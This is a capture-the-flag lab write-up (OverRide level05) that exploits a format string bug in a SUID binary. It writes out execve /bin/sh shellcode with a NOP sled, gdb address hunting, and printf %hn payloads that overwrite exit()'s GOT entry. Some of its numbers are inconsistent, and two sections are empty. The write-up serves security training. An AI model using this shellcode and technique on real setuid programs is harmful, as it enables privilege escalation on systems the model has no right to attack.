# Level 5

## Vulnerability



## Context

We find a binary with owner ```level05``` and SUID.
```
level05@OverRide:~$ ls -l
-rwsr-s---+ 1 level06 users 5176 Sep 10  2016 level05
```

When run ...!!!!!
```
level05@OverRide:~$ ./level05
hello
hello
```

## Solution

### main() overview

Let's take a deeper look at the program. See [dissasembly notes](https://github.com/anyashuka/Override/blob/main/level05/Ressources/disassembly_notes.md) for detailed gdb assembly breakdown.

This program is a basic ```tolower()```, which is of little interest to us. 

However we do see a call to ```printf()```, which is vulnerable to string format exploits. 

We also see a call to ```exit()```.

### Build exploit

Unfortunately, we see the stack is non-executable. 

We can overflow the buffer, but we can't overwrite the EIP with an address (like ```system("/bin/sh")```) in the stack because it won't execute.
```
level05@OverRide:~$ dmesg | grep "Execute Disable"
[    0.000000] NX (Execute Disable) protection: active
```

Instead, we will:
- use a shellcode stored in an environmental variable 
- to run a string format attack to overwrite ```exit()``` 

We will use [this compact system call opening a shell](http://shell-storm.org/shellcode/files/shellcode-827.php).
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```
We will prefix the shellcode with a 100 byte NOP slide, and then store it all in an environment variable. 
```
level05@OverRide:~$ export SHELLCODE=`python -c 'print("\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`
```

Let's find the address of our malicious shellcode / environment variable. 
```
(gdb) break *main+4
Breakpoint 1 at 0x8048448
(gdb) r
[...]
(gdb) x/200s environ
0xffffd806:	 "/home/users/level05/level05"
0xffffd822:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343PS\211\341\260\v̀"
0xffffd8a8:	 "SHELL=/bin/bash"
```
Our malicious shellcode is at ```0xffffd822```. 

Note: we want to move past the first 10 bytes "SHELLCODE=" and into your NOP slide... so let's make the address of our shellcode ```0xffffd822 + 16 bytes -> 0xffffd832```.

We are going to insert this malicious code using a ```printf()``` format string attack. 

Unfortunately, ```0xffffd832``` is too large to pass to ```printf()``` in decimal with a ```%d``` format (it overflows maxint).
```
2147483647 <- maximum size of int
4294957106 <- address of shellcode (in decimal)
```
We can, however, pass it in decimal as 2 short ints (written on 2 bytes each). 

Note: reverse order for little endian! 
```
0xffffd832
0xd832 -> 55346
0xffff -> 65535
```

Next, find the address of ```exit()```. The GOT address of ```exit()``` is ```0x080497e0```.
```
level05@OverRide:~$ gdb -q level05
(gdb) info function exit
[...]
0x08048370  exit
0x08048370  exit@plt
(gdb) x/i 0x08048370
   0x8048370 <exit@plt>:	jmp    *0x80497e0
```
We will also have to split the address of ```exit()``` in two, to accomodate our hefty 2-part shellcode address. 

Finally, let's check our buffer position for the ```printf()``` string format exploit.

We can see our buffer "AAAA" in the 10th position on the stack as 61616161.
```
level05@OverRide:~$ python -c 'print "AAAA"+" %x"*12' | ./level05
aaaa 64 f7fcfac0 f7ec3af9 ffffd69f ffffd69e 0 ffffffff ffffd724 f7fdb000 61616161 20782520 25207825
```

Looks good... Let's sum it all up! 

Our attack takes place in 2 steps:
- malicious environment variable 
```
"NOP slide [100 bytes] + call to open a shell"
```

- format string attack
  - exit GOT address, split into two [4 byte] parts
  - shellcode address in decimal, split into two [4 byte] parts
      - ``` 55346 - 8 bytes (of characters already written)``` -> ```55338```
      - ```65535 - 55338 bytes (of characters already written)``` -> ```10197```
  -  ```printf()``` formatting arguments: 
      - ```%10$hn``` for 10th argument, half word/short int [2 bytes]
      - ```%11$hn``` for 11th argument, half word/short int [2 bytes]
```
"exit GOT address [2 first bytes] + exit GOT address [2 last bytes] + shellcode addr [2 bytes] + '%10$hn' + shellcode addr [2 bytes] + '%11$hn'"
```

Let's try it. 
```
(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55338d%10$hn" + "%10197d%11$hn")'; cat) | ./level05
```

Why we can't just do this (with a %u modifier) is beyond me!
```(python -c 'print "\xe0\x97\x04\x08" + "%4294957094u" + "%10$n"'; cat) | ./level05```

```(python -c 'print "\xe0\x97\x04\x08" + "%4294957098u" + "%10$n"'; cat) | ./level05```


```
(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55397d%10$hn" + "%10130d%11$hn")'; cat) | ./level05
```


## Recreate Exploited Binary


